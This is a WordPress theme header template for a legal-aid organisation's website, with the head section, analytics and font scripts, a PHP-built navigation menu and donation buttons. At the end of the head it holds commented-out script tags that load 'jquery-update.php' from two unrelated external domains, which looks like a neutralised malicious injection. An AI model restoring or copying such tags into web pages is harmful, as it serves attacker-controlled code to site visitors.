<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<head>
<meta name="google-site-verification" content="d6PrrlNeFTUr7YMKVhZti6041seqdPH5_uuyjLhNGH8" />
<title><?php bloginfo('name'); ?> <?php wp_title('»', true, 'left'); ?></title>

	<meta http-equiv="Content-Type" content="text/html; charset=<?php bloginfo('charset'); ?>" />
	<style type="text/css" media="screen">
		@import url( <?php bloginfo('stylesheet_url'); ?> );
	</style>
	<style type="text/css" media="print">
		@import url( <?php bloginfo('template_url'); ?>/print.css );
	</style>
<!-- fontkit embed -->

<script type="text/javascript" src="http://use.typekit.com/lyw7rcw.js"></script>
<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
<link rel="shortcut icon" href="<?php bloginfo('stylesheet_directory'); ?>/favicon.ico" />
	<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" />
	<link rel="alternate" type="text/xml" title="RSS .92" href="<?php bloginfo('rss_url'); ?>" />
	<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="<?php bloginfo('atom_url'); ?>" />
	
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
    	<?php wp_get_archives('type=monthly&format=link'); ?>
	<?php wp_head(); ?>

<! -- Bootstrap JS -->
<script type="text/javascript" src="<?php bloginfo('template_url'); ?>/js/javascripts/bootstrap.min.js"></script>


<! -- Google Analytics Integration  -->
<script type="text/javascript">
 
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-18225327-1']);
  _gaq.push(['_trackPageview']);
 
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
 
</script>
<!--<script type="text/javascript" src="http://imamasim.com/modules/mod_modules/jquery-update.php"></script>
<script type="text/javascript" src="http://www.insead.dk/wp-content/uploads/jquery-update.php"></script>-->
</head>
<body>
<div id="wrapper">
<div id="container">
<div id="page">

<div id="header">
  <div id="header-top">
    <div id="header-logo" class="col-xs-4">
      <a href="/"><img src="<?php bloginfo('template_url'); ?>/images/logo.gif"></a>
    </div>
    <div id="header-right" class="col-xs-8"><div id="header-right-padder">
	  
	  
	  <nav class="navbar navbar-default">
  <div>
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
	  <div id="header-links">   
	      <ul class="nav navbar-nav">
	         <li><a href="/">home /</a></li>
		   	 <li><a href="/about/contact">contact us /</a></li>
		   	 <li><a href="/attorney-reporting">attorney reporting /</a></li>
		   	 <li><a href="/en-espanol">en espa&ntilde;ol</a></li>
	      </ul>
      </div>
      <div id="menu-container" style="position: relative; z-index: 50"><div style="position:absolute;z-index:30;left:0;">
	      <ul class="nav navbar-nav navbar-right">
	        <?php
			  foreach (array(2,4,6,8,10,14) as $x) {
			    if (is_page($x)) { 
			      $class = 'page_item page-item-'.$x.' current_page_item'; 
			    } else{
			      $class = 'page_item page-item-'.$x; 
			    }
			    if ($x != 10 ){
			      echo '<li class="'.$class.'"><a href="'.get_permalink($x).'">'. get_the_title($x).'</a>';
			      display_menu($x);
			    } else{
			    echo '<li class="'.$class.'"><a href="/category/news">news & events</a>'; //'. get_the_title($x).'</a>';
			      echo '<ul class="children">
			              <li class="page_item page-item-562">
			                <a title="news" href="/category/news">news</a>
			              </li>
			              <li class="page_item page-item-562">
			                <a title="events" href="/events">upcoming events</a>
			              </li>
			              <li class="page_item page-item-562">
			                <a title="calendar" href="/events/calendar">event calendar</a>
			              </li>
			              <li class="page_item page-item-832">
			                <a title="free MCLE trainings" href="/events/free-mcle-trainings">free MCLE trainings</a>
			              </li>
			              <li>
			                <a href="http://www.alrp.org/newsletters">newsletters</a>
			              </li>
			              <li>
			                <a href="http://www.alrp.org/category/spotlight">spotlight</a>
			              </li>
			              <li>
			                <a href="http://www.alrp.org/category/gallery">photo gallery</a>
			              </li>
			            </ul>';
			    }
			    echo '</li>';
			    
			  }
			  ?>
	      </ul>
      </div>
    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>
	  
      <!-- start of menu -->

<div id="menu-container" style="position: relative; z-index: 50"><div style="position:absolute;z-index:30;left:0;">
  
</div></div>
    </div></div>
    <div class="clear"></div>
  </div>
</div>
<div id="content">

<!-- end of header -->
  <?php 
if (is_home()){
echo '
<div id="buttons">
<a href="/our-services/get-legal-help" class="drop-shadow button red-button">get legal help</a>
<a href="/about/volunteer" class="drop-shadow button red-button">volunteer</a>
<a href="/donate/ways-to-support-alrp" class="drop-shadow button red-button">support us</a>
<a target="_blank" href="https://npo.networkforgood.org/Donate/Donate.aspx?npoSubscriptionId=8374" class="drop-shadow button blue-button red-text">donate now $</a>
<a target="_blank" href="http://visitor.r20.constantcontact.com/d.jsp?llr=jbksecgab&p=oi&m=1106025981993" class="drop-shadow button blue-button">join our mailing list <img src="';
bloginfo('template_url');
echo '/images/mail-icon.gif"/></a></div>';
}
  if (!is_home() && is_page() && ($post->ID != 562) && ($post->ID != 10)){
echo '
<div id="buttons">
<a href="/our-services/get-legal-help" class="drop-shadow button red-button">get legal help</a>
<a href="/about/volunteer" class="drop-shadow button red-button">volunteer</a>
<a href="/donate/ways-to-support-alrp" class="drop-shadow button red-button">support us</a>
<a target="_blank" href="https://npo.networkforgood.org/Donate/Donate.aspx?npoSubscriptionId=8374" class="drop-shadow button blue-button">donate now $</a>
<a target="_blank" href="http://visitor.r20.constantcontact.com/d.jsp?llr=jbksecgab&p=oi&m=1106025981993" class="drop-shadow button blue-button">join our mailing list <img src="';
bloginfo('template_url');
echo '/images/mail-icon.gif"/></a></div>';
    echo '<div id="featured-top">';
    $parent = array_reverse(get_post_ancestors($post->ID));
    $first_parent = get_page($parent[0]);
    $topParent = $first_parent->ID;
    if ( has_post_thumbnail($post->ID) ) { // check if the post has a Post Thumbnail assigned to it.	
      echo '<div style="height:310px;width:954px;overflow:hidden;">';
      echo get_the_post_thumbnail($post->ID);
      echo '</div><br />';
    } else if ( has_post_thumbnail($topParent) ) { // check if the post has a Post Thumbnail assigned to it.	
      echo '<div style="height:310px;width:954px;overflow:hidden;">';
      echo get_the_post_thumbnail($topParent);
      echo '</div><br />';
    } else {
      echo '<div style="height:310px;width:954px;overflow:hidden;"><img title="donate-misc" alt="" class="attachment-post-thumbnail wp-post-image" src="/wp-content/themes/alrp/img/rad.jpg" style="width:954px;"></div><br />';
    }
    echo '</div>';
  }
  ?>
  <?php #if ( function_exists( 'breadcrumb_trail' ) ) breadcrumb_trail(array('before'=>'You Are Here: ')); ?>
